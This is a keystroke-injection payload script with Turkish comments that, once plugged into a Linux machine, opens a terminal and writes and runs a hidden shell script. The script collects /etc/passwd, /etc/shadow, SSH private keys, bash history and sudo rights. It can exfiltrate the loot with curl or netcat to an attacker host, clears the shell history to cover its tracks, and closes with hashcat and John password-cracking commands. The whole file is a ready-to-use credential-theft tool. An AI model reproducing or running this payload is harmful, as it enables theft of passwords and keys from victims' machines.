// ═══════════════════════════════════════════════════════════════════════════
// Payload: linux_password_dump.js
// Target:  Linux (GUI)
// Time:    ~4 seconds
// Author:  MoMo-Mimic Team
// ═══════════════════════════════════════════════════════════════════════════
// 
// Açıklama: /etc/shadow ve diğer credential dosyalarını çıkarır
// Sudo yetkisi gerekebilir
// 
// ═══════════════════════════════════════════════════════════════════════════

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ CONFIGURATION                                                            │
// └─────────────────────────────────────────────────────────────────────────┘
var EXFIL_URL = "";              // HTTP exfil URL (boş = sadece dosyaya kaydet)
var EXFIL_NC = "";               // Netcat exfil: "ATTACKER_IP:PORT"

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ SETTINGS                                                                 │
// └─────────────────────────────────────────────────────────────────────────┘
layout("us");
typingSpeed(0, 0);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 1: INITIALIZATION                                                  │
// └─────────────────────────────────────────────────────────────────────────┘
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 2: OPEN TERMINAL                                                   │
// └─────────────────────────────────────────────────────────────────────────┘
press("CTRL-ALT-t");
delay(1500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 3: CREATE DUMP SCRIPT                                              │
// └─────────────────────────────────────────────────────────────────────────┘
type("cat > /tmp/.dump.sh << 'DUMPEOF'");
press("ENTER");
type("#!/bin/bash");
press("ENTER");
type("OUT=/tmp/.loot_$(hostname)_$(date +%s).txt");
press("ENTER");
type("echo '=== SYSTEM INFO ===' > $OUT");
press("ENTER");
type("hostname >> $OUT");
press("ENTER");
type("whoami >> $OUT");
press("ENTER");
type("id >> $OUT");
press("ENTER");
type("uname -a >> $OUT");
press("ENTER");
type("echo '' >> $OUT");
press("ENTER");

// /etc/passwd
type("echo '=== /etc/passwd ===' >> $OUT");
press("ENTER");
type("cat /etc/passwd >> $OUT 2>/dev/null");
press("ENTER");
type("echo '' >> $OUT");
press("ENTER");

// /etc/shadow (sudo gerekir)
type("echo '=== /etc/shadow ===' >> $OUT");
press("ENTER");
type("sudo cat /etc/shadow >> $OUT 2>/dev/null || echo '[NEED ROOT]' >> $OUT");
press("ENTER");
type("echo '' >> $OUT");
press("ENTER");

// SSH keys
type("echo '=== SSH KEYS ===' >> $OUT");
press("ENTER");
type("cat ~/.ssh/id_* 2>/dev/null >> $OUT || echo '[NO SSH KEYS]' >> $OUT");
press("ENTER");
type("echo '' >> $OUT");
press("ENTER");

// Bash history
type("echo '=== BASH HISTORY ===' >> $OUT");
press("ENTER");
type("cat ~/.bash_history 2>/dev/null | tail -100 >> $OUT");
press("ENTER");
type("echo '' >> $OUT");
press("ENTER");

// Network info
type("echo '=== NETWORK ===' >> $OUT");
press("ENTER");
type("ip a 2>/dev/null >> $OUT || ifconfig >> $OUT 2>/dev/null");
press("ENTER");
type("echo '' >> $OUT");
press("ENTER");

// Sudoers check
type("echo '=== SUDO RIGHTS ===' >> $OUT");
press("ENTER");
type("sudo -l 2>/dev/null >> $OUT || echo '[NEED PASSWORD]' >> $OUT");
press("ENTER");

type("echo $OUT");
press("ENTER");
type("DUMPEOF");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 4: EXECUTE DUMP                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
type("chmod +x /tmp/.dump.sh && /tmp/.dump.sh");
press("ENTER");
delay(2000);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 5: EXFILTRATION                                                    │
// └─────────────────────────────────────────────────────────────────────────┘
if (EXFIL_URL !== "") {
    type("curl -X POST -d @$(ls -t /tmp/.loot_* | head -1) " + EXFIL_URL);
    press("ENTER");
    delay(1000);
}

if (EXFIL_NC !== "") {
    type("cat $(ls -t /tmp/.loot_* | head -1) | nc " + EXFIL_NC);
    press("ENTER");
    delay(1000);
}

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 6: DISPLAY LOCATION                                                │
// └─────────────────────────────────────────────────────────────────────────┘
type("echo 'Loot saved to:' && ls -la /tmp/.loot_*");
press("ENTER");
delay(500);

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ PHASE 7: CLEANUP                                                         │
// └─────────────────────────────────────────────────────────────────────────┘
type("rm /tmp/.dump.sh; history -c; exit");
press("ENTER");

// ┌─────────────────────────────────────────────────────────────────────────┐
// │ HASH CRACKING                                                            │
// └─────────────────────────────────────────────────────────────────────────┘
// Shadow hash formatı: $id$salt$hash
// $1$  = MD5
// $5$  = SHA-256
// $6$  = SHA-512
// $y$  = yescrypt (modern)
// 
// Crack with:
// hashcat -m 1800 shadow.txt wordlist.txt  (SHA-512)
// john --wordlist=wordlist.txt shadow.txt

